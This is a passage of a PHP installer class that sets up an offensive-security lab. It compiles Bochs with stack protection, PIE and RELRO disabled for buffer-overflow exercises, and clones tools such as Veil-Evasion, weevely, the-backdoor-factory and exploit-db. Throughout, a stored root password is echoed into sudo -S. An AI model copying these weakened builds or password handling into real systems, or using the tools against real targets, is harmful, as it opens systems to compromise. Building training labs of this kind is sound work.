	    $this->requette("tar -xvf $this->dir_install/bof/bochs-2.6.5.tar.gz -C $this->dir_tmp/");
	    $this->requette("cd $this->dir_tmp/bochs-2.6.5/; ./configure --build=i686-pc-linux-gnu 'CFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'CXXFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' 'LDFLAGS=-ggdb -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386' ");
	    $this->requette("cd $this->dir_tmp/bochs-2.6.5/; make");
	}
	
	
	
	
	public function install_bof(){
	    $this->install_bof_stack4linux_bochs265();
	    $this->install_bof_stack4linux_crashmail();
	    $this->install_bof_stack4linux_dnstracer19();
	    $this->install_bof_stack4linux_ekg();
	    $this->install_bof_stack4linux_fasm17121();
	    $this->install_bof_stack4linux_iselect1402();
	    $this->install_bof_stack4linux_jad();
	    $this->install_bof_stack4linux_mawk133();
	    $this->install_bof_stack4linux_sc();
	    $this->install_bof_stack4linux_sipp33();
	    $this->install_bof_stack4linux_temu303();
	    $this->install_bof_stack4linux_wifirx();
	    $this->install_bof_stack4linux_xwpe();
	    $this->install_bof_stack4linux_ytree();
	    
	}
	
	function install_for_gdb_plugins(){
		$this->requette("cd /opt/ ; echo '$this->root_passwd' | sudo -S git clone https://github.com/snare/voltron");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  /opt/voltron");
		$this->requette("cd /opt/voltron; bash ./install.sh");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  /opt/voltron");
	}
	
	function install_malware_veil(){
		$this->ssTitre(__FUNCTION__);
		if (!file_exists("/opt/Veil-Evasion/setup/setup.sh")) {
			$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_install/localhost/Veil-Evasion-master.zip -d  /opt");
			$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  /opt/Veil-Evasion-master");
			$this->requette("cd /opt/Veil-Evasion-master/setup/; echo '$this->root_passwd' | sudo -S bash setup.sh");
		}
		$this->pause();
	}
	
	function install_labs_vmware_workstation(){
		$this->ssTitre(__FUNCTION__);
		$path_soft = "/usr/lib/vmware";
		$vmware_workstation = "VMware-Workstation-Full-14.1.2-8497320.x86_64.bundle";
		if(!$this->check_soft_exist($path_soft)) {
			$this->requette("echo '$this->root_passwd' | sudo -S chmod +x $this->dir_install/localhost/vmware/$vmware_workstation");
			$this->requette("gedit $this->dir_install/localhost/vmware/vmware_workstation_14.key");
			$this->cmd("localhost","echo '$this->root_passwd' | sudo -S $this->dir_install/localhost/vmware/$vmware_workstation");
			$this->pause();
		}
	}
	
	
	function install_labs_git(){
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $this->dir_php/.git");
		$this->requette(" git init --bare .git");
		$this->requette("echo '$this->root_passwd' | sudo -S groupadd gitgroup");
		$this->requette("cat /etc/group | grep gitgroup ");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S useradd  gituser ");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S useradd  gituser gitgroup ");
		$this->requette("cd $this->dir_php/.git; echo '$this->root_passwd' | sudo -S chmod -R g+ws ./* ");
		$this->requette("cd $this->dir_php/.git;echo '$this->root_passwd' | sudo -S chown gituser -R . ");
		$this->requette("cd $this->dir_php/.git; echo '$this->root_passwd' | sudo -S chgrp -R gitgroup . ");
		$this->requette("cd $this->dir_php/.git; echo '$this->root_passwd' | sudo -S -u gituser git config core.sharedRepository true");
		
		$this->pause();

	
		$this->requette("git config --global user.name \"gituser\" ");
		$this->requette("git config --global user.email \"$this->user2email\" ");
		$this->requette("cd $this->dir_php/.git; git status");
		$this->requette("cd $this->dir_php/.git; echo 'test' > $this->dir_php/README ");
		$this->requette("cd $this->dir_php/.git;echo '$this->root_passwd' | sudo -S -u gituser git add . ");
		$this->requette("cd $this->dir_php/.git; git status");
		$this->cmd("localhost","git clone gituser@labs:/opt/git/git.git ");
	
		$this->requette("cd $this->dir_php/.git; git status");
		$this->requette("cd $this->dir_php/.git;echo '$this->root_passwd' | sudo -S -u gituser git add . ");
		$this->requette("cd $this->dir_php/.git;echo '$this->root_passwd' | sudo -S -u gituser git commit -m \"My first commit\" ");
		$this->requette("cd $this->dir_php/.git; git status");
		$this->requette("cd $this->dir_php/.git; git log");
	
		$this->cmd("localhost","cd $this->dir_php/.git;git remote add origin gituser@labs:/opt/git/git.git ");
		$this->cmd("localhost","cd $this->dir_php/.git;git push -u origin master ");
		$this->cmd("localhost","cd $this->dir_php/.git;git gui ");
		$this->pause();
	}
	
	function install_malware_weevely(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/epinna/weevely3.git /opt/weevely3");
		$this->requette("tree /opt/weevely3 ");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/weevely3");
		$this->requette("ls -lR /opt/weevely3/* ");
	}
	
	function install_malware_pefile(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/erocarrera/pefile.git /opt/pefile");
		$this->requette("tree /opt/pefile ");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/pefile");
		$this->requette("cd /opt/pefile; echo '$this->root_passwd' | sudo -S python setup.py install ");
	}
	
	
	function install_for_xplico(){
		$this->ssTitre(__FUNCTION__);
		$this->net("https://github.com/xplico/xplico/blob/master/INSTALL");$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S apt install -y libx11-dev libxt-dev libxaw7-dev python3 python3-httplib2 python3-psycopg2 sqlite3 recode sox lame libnet1 libnet1-dev binfmt-support libssl-dev build-essential perl libzip-dev libpcap-dev libsqlite3-dev dh-autoreconf");
		$this->requette("echo '$this->root_passwd' | sudo -S bash -c 'echo \"deb http://repo.xplico.org/ $(lsb_release -s -c) main\" >> /etc/apt/sources.list'");
		$this->requette("echo '$this->root_passwd' | sudo -S apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 791C25CE");
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get update");
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y xplico");
	
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/ntop/nDPI.git /opt/nDPI");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/nDPI");
		$this->requette("cd /opt/nDPI; ./configure --with-pic ; make ;echo '$this->root_passwd' | sudo -S make install ");
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/json-c/json-c.git /opt/json-c");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/json-c");
		$this->requette("cd /opt/json-c; ./autogen.sh ; ./configure ; make ;echo '$this->root_passwd' | sudo -S make install ");
	}
	
	
	public function install_exploit(){
		$this->titre(__FUNCTION__);
		
		//$this->install_exploit_armitage();
		$this->install_exploit_automater();
		//$this->install_exploit_console_openvas();
		
		$this->install_exploit_exploitdb();
	}
	
	function install_exploit_exploitdb(){
		$this->ssTitre(__FUNCTION__);
		$filename = "/opt/exploitdb/searchsploit";
		if (!file_exists($filename)) {
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/offensive-security/exploit-database.git /opt/exploitdb");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  /opt/exploitdb");
		$this->requette("echo '$this->root_passwd' | sudo -S ln -sf $filename /usr/local/bin/searchsploit");
		$this->requette("cp -n /opt/exploitdb/.searchsploit_rc ~/");
		$this->requette("$filename -u");
		//$this->install_exploit_exploitdb_update();
		}
		
	}
	
	function install_exploit_armitage(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/rsmudge/armitage.git /opt/armitage");
		/*
		$this->requette("echo '$this->root_passwd' | sudo -S ln -s /opt/armitage/armitage /usr/local/bin/armitage");
		$this->requette("echo '$this->root_passwd' | sudo -S ln -s /opt/armitage/teamserver /usr/local/bin/teamserver");
		$this->requette(" sh -c \"echo java -jar /opt/armitage/armitage.jar \$\* > /opt/armitage/armitage\" ");
		$this->requette(" perl -pi -e 's/armitage.jar/\/opt\/armitage\/armitage.jar/g' /opt/armitage/teamserver");
		$this->requette("echo '$this->root_passwd' | sudo -S gedit /opt/metasploit/database.yml");
		*/
	}
	
	
	function install_exploit_console_openvas(){
		$this->ssTitre(__FUNCTION__);
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install openvas-server openvas-client");
		$this->cmd("localhost"," openvas-adduser");
		$this->requette("echo -e \"Rentrez le nom de l’utilisateur\nMode d’authentification par mot de passe(pass)\nRentrez deux fois le mot de passe\nNe définissez pas de règles(Ctrl+D)\nIs that ok ? y\n\" ");
		$this->requette("echo -e \"login/Pass $this->mysql_login/$this->mysql_passwd\" ");
		$this->pause();
	}
	
	function install_malware_backdoor_factory(){
		$this->ssTitre(__FUNCTION__);
		if(!is_dir("/opt/the-backdoor-factory"))
		{
			$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/secretsquirrel/the-backdoor-factory.git /opt/the-backdoor-factory ");
			$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/the-backdoor-factory ");
			$this->requette("cd /opt/the-backdoor-factory ;echo '$this->root_passwd' | sudo -S -H bash install.sh");
		}
	}
	
	
	
	###########################################################################
	
	
	public function install_soft(){ // OK 
	    $this->ssTitre("Install in CONSOLE");
	    $this->cmd("localhost","for i in `cat $this->dir_install/install/install.console` ; do sudo apt-get -y install \$i ;done  ");
	    $this->pause();
	    
	    
	     $tab_soft_apt = file("$this->dir_install/install/install.apt");
	     $tab_soft_pip2 = file("$this->dir_install/install/install.pip2");
	     $tab_soft_pip3 = file("$this->dir_install/install/install.pip3");
	     $tab_soft_cpan = file("$this->dir_install/install/install.cpan");
	     $tab_soft_gems = file("$this->dir_install/install/install.gems");
	     $tab_soft_brew = file("$this->dir_install/install/install.brew");
	     $tab_soft_snap = file("$this->dir_install/install/install.snap");
	     
	     $this->ssTitre("Install in APT");foreach($tab_soft_apt as $soft_name) $this->install_soft_apt($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in PIP2");foreach($tab_soft_pip2 as $soft_name) $this->install_soft_pip2($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in PIP3");foreach($tab_soft_pip3 as $soft_name) $this->install_soft_pip3($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in CPAN");foreach($tab_soft_cpan as $soft_name) $this->install_soft_cpan($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in GEMS");foreach($tab_soft_gems as $soft_name) $this->install_soft_gems($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in BREW");foreach($tab_soft_brew as $soft_name) $this->install_soft_brew($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     $this->ssTitre("Install in SNAP");foreach($tab_soft_snap as $soft_name) $this->install_soft_snap($soft_name);$this->pause();$this->ssTitre("Upgrade on Host");$this->update_dep(); // OK 
	     
	    
	}
	
	function update_dep(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S apt-get autoremove -y ; echo '$this->root_passwd' | sudo -S apt-get update -y; echo '$this->root_passwd' | sudo -S apt-get autoremove -y ; echo '$this->root_passwd' | sudo -S apt-get upgrade -y ; echo '$this->root_passwd' | sudo -S apt-get autoremove -y ;echo '$this->root_passwd' | sudo -S apt-get dist-upgrade -y ; echo '$this->root_passwd' | sudo -S apt-get autoremove -y ; echo '$this->root_passwd' | sudo -S apt-get full-upgrade -y ");
	}
	
	function check_soft_exist($path_soft){
		return file_exists($path_soft);
	}
	
	function install_soft_console($soft_name){
		if (!empty(trim($soft_name))) $this->cmd("localhost"," echo '$this->root_passwd' | sudo -S apt-get -y install $soft_name ");
	}
	
	function install_soft_apt($soft_name){
		if (!empty(trim($soft_name))) $this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y  $soft_name");
	}
	
	function install_soft_brew($soft_name){
		if (!empty(trim($soft_name))) $this->requette("brew install $soft_name");
	}

	
	function install_soft_pip2($soft_name){
	    if (!empty(trim($soft_name))) $this->requette("pip2 install --user $soft_name ");
	}
	
	
	function install_soft_pip3($soft_name){
	    if (!empty(trim($soft_name))) $this->requette("pip3 install --user $soft_name ");
	}
	
	function install_soft_gems($soft_name){
		// bundle install dans le gemfile -> pour les dependances
		/*
		bundle update
		bundle install --jobs --retry --gemfile ./Gemfile
		*/
		if (!empty(trim($soft_name))) $this->requette("echo '$this->root_passwd' | sudo -S -H gem install $soft_name");
	}
	
	function install_soft_rvm($soft_name){
		if (!empty(trim($soft_name))) $this->requette("echo '$this->root_passwd' | sudo -S  rvm install $soft_name");
	}
	
	function install_soft_snap($soft_name){
	    if (!empty(trim($soft_name))) $this->requette("echo '$this->root_passwd' | sudo -S  snap install $soft_name");
	}
	
	function install_soft_perl($module,$soft_name){
		//  perl -MCPAN -e 'install $module'
		if (!empty(trim($soft_name))) $this->requette("echo '$this->root_passwd' | sudo -S  perl -m $module $soft_name");
	}
	
	function install_soft_cpan($soft_name){
		if (!empty(trim($soft_name))) $this->requette("echo '$this->root_passwd' | sudo -S  cpan $soft_name ");
	}
	
	function check_soft($tab_soft){
		$soft_not_find = array();
		foreach($tab_soft as $soft)
		{
			article("CHECK SOFT",$soft);
			$path_soft = system("whereis $soft");
			if(!empty($path_soft)) $soft_not_find[] = $path_soft;
			else article("\t$soft","INSTALLED in $path_soft");
		}
		return $soft_not_find;
	}
	
	
	function install_labs_openldap(){
		$this->ssTitre(__FUNCTION__);
		$this->note("
				change /etc/ldap/ldap.conf 
BASE	dc=hack,dc=vlan
URI	ldap://ldap.hack.vlan");
		$this->requette("echo '$this->root_passwd' | sudo -S apt install -y slapd ldap-utils");
		/*
		 change /etc/ldap/ldap.conf 
BASE	dc=hack,dc=vlan
URI	ldap://ldap.hack.vlan

		 */
		$this->cmd("localhost", "gedit /etc/ldap/ldap.conf");
		
		$this->requette("echo \"BASE	dc=hack,dc=vlan\nURI	ldap://ldap.hack.vlan\n\" | echo '$this->root_passwd' | sudo -S tee -a /etc/ldap/ldap.conf");
		
		
		$this->requette("cat /etc/hostname");
		$this->requette("cat /etc/group");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S dpkg-reconfigure slapd");
		$this->cmd("test openldap", "ldapsearch -x");
		$this->cmd("USER", "cat /etc/passwd");
		$this->pause();
		
	}
	
	function install_labs_egypt(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/egypt-1.10/";
	    if(!is_dir($dir_search))
	    {
	        $this->requette("echo '$this->root_passwd' | sudo -S  tar -xzf $this->dir_install/localhost/egypt-1.10.tar.gz -C /opt/");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search ");
	        $this->requette("cd $dir_search;echo '$this->root_passwd' | sudo -S -H perl Makefile.PL;make ;  echo '$this->root_passwd' | sudo -S  make install");
	    }
	}
	
	
	function install_labs_theharvester(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/theharvester";
	    if(!is_dir($dir_search))
	    {
	        $this->requette("echo '$this->root_passwd' | sudo -S -H python3 -m pip install pipenv");
	        $this->requette("pipenv install");
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/laramies/theHarvester.git $dir_search");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  $dir_search");
	        $this->requette("cd $dir_search; echo '$this->root_passwd' | sudo -S -H pip3 install -r requirements.txt ");
	        
	     }
	    
	}
	
	function install_labs_sublist3r(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/sublist3r";
	    if(!is_dir($dir_search))
	    {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/aboul3la/Sublist3r.git $dir_search");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  $dir_search");
	        $this->requette("cd $dir_search; echo '$this->root_passwd' | sudo -S -H pip install -r requirements.txt ");
	        
	    }
	    
	}
	
	function install_labs_paxtest(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/paxtest-0.9.14";
	    if(!is_dir($dir_search))
	    {
	        $this->requette("echo '$this->root_passwd' | sudo -S tar -xvf $this->dir_install/localhost/paxtest-0.9.14.tar.gz -C /opt/");
	        $this->requette("cd $dir_search; echo '$this->root_passwd' | sudo -S make linux64");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search");
	    }
		}
	
	
	function install_malware_shellcode(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/libemu";
	    if(!is_dir($dir_search))
	    {
	        //$this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/localhost/libemu2_0.2.0+git20120122-1.2_amd64.deb");
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/gento/libemu.git $dir_search");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  $dir_search");
	        $this->requette("cd $dir_search;autoreconf -v -i;./configure --enable-python-bindings --prefix=$dir_search");
	        $this->requette("echo '$this->root_passwd' | sudo -S make install");
	        $this->requette("echo '$this->root_passwd' | sudo -S ldconfig -n $dir_search/lib");
	    }
			
	
		if(!$this->check_soft_exist("/opt/pylibemu/setup.py")) {
			$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/buffer/pylibemu.git /opt/pylibemu ");
			$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  /opt/pylibemu");
			$this->requette("cd /opt/pylibemu;python setup.py build; echo '$this->root_passwd' | sudo -S -H python setup.py install");}	
			if(!file_exists("/opt/egypt/Makefile.PL")) $this->install_labs_egypt();
			
	}
	
	
	
	
}
